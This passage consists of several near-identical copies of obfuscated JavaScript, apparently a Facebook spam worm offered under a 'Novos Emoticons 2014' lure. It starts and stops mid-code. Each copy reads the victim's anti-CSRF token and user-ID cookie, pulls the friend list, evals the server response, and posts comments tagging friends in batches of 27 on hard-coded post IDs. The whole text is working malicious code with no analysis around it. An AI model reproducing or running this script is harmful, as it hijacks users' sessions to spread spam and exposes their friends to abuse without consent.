","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","454755387989346","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","625745820834132","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","486849431414513","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","277013782477756","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","235225856677513","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var 